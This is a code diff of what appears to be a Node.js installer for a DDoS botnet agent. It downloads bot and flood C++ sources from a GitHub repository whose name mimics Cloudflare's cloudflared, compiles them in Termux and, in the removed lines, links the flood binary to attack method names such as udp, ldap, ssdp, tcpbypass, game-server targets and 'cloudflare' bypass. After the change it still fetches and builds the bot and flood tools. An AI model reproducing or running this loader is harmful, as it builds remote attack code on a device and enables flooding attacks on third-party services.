@@ -15,17 +15,7 @@ const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main
 const SOURCE_FILES = [
     { url: `${REPO_BASE}/bots/bot.cpp`, filename: 'bot.cpp' },
     { url: `${REPO_BASE}/bots/flood.cpp`, filename: 'flood.cpp' },
-    { url: `${REPO_BASE}/bots/http.cpp`, filename: 'http.cpp' },
-    { url: `${REPO_BASE}/bots/https.cpp`, filename: 'https.cpp' },
     { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt' }
-];
-
-const METHODS = [
-    'dns', 'udp', 'ldap', 'ssdp', 'home', 'udpbypass',
-    'tcp', 'socket', 'ovh', 'tcpmix', 'tcpbypass', 'ack',
-    'game', 'rainbow', 'rocket', 'roblox', 'fivem', 'pubg', 'fortnite', 'warthunder', 'counter', 'samp',
-    'subnet', 'icmp',
-    'http', 'https', 'httpx', 'rapidflood', 'tls', 'tlsx', 'bypass', 'browser', 'cache', 'cloudflare'
 ];
 
 function downloadHttp(url, destPath) {
@@ -113,9 +103,7 @@ function compileSources(targetDir) {
 
     const targets = [
         { src: 'bot.cpp', bin: 'bot', flags: '-O2' },
-        { src: 'flood.cpp', bin: 'flood', flags: '-O2 -pthread -lssl -lcrypto' },
-        { src: 'http.cpp', bin: 'http', flags: '-O2 -pthread' },
-        { src: 'https.cpp', bin: 'https', flags: '-O2 -pthread -lssl -lcrypto' }
+        { src: 'flood.cpp', bin: 'flood', flags: '-O2 -pthread -lssl -lcrypto' }
     ];
 
     for (const t of targets) {
@@ -136,24 +124,6 @@ function compileSources(targetDir) {
                 console.error(`[!] Compilation error for ${t.bin}: ${err.message}`);
             }
         }
-    }
-
-    const floodPath = path.join(targetDir, 'flood');
-    if (fs.existsSync(floodPath)) {
-        console.log('[*] Setting up method symlinks in Termux...');
-        for (const m of METHODS) {
-            const linkPath = path.join(targetDir, m);
-            try {
-                if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath);
-                fs.symlinkSync('flood', linkPath);
-            } catch (_) {
-                try {
-                    fs.copyFileSync(floodPath, linkPath);
-                    fs.chmodSync(linkPath, 0o755);
-                } catch (_) {}
-            }
-        }
-        console.log('[+] All method links ready.');
     }
 }
 
